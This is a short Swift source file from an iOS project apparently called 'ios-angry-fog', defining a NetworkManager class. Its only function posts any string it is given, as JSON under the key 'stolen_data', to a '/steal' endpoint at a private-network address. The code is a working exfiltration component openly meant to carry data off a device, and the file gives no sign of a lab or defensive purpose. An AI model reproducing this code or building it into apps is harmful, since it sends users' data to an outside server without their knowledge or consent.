//
//  NetworkManager.swift
//  ios-angry-fog
//
//  Created by Mariia Glushenkova on 28.4.2025.
//



// 📄 NetworkManager.swift
import Foundation

class NetworkManager {
    static func sendData(data: String) {
        guard let url = URL(string: "http://192.168.1.100:5000/steal") else { return }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")

        let body: [String: Any] = ["stolen_data": data]
        request.httpBody = try? JSONSerialization.data(withJSONObject: body)

        URLSession.shared.dataTask(with: request).resume()
    }
}
